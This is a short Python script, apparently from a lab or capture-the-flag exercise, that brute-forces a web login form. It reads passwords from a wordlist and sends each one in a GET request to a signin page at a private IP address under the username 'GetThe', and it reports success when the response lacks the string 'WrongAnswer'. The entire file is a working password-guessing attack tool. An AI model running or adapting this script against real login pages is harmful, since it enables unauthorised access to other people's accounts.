import requests
import argparse

def brute_force(wordlist_path):
    with open(wordlist_path, 'r') as wordlist:
        for line in wordlist:
            password = line.strip()  # Remove newline characters
            print("[+]Trying {0}".format(password))
            response = requests.get('http://10.14.59.83/index.php?page=signin&username=GetThe&password='+password+'&Login=Login')
            if "WrongAnswer" not in response.text:
                print(f"Password found: {password}")
                return
    print("Password not found in the provided wordlist")

def main():
    parser = argparse.ArgumentParser(description="Simple brute force script")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    args = parser.parse_args()

    brute_force(args.wordlist)

if __name__ == "__main__":
    main()
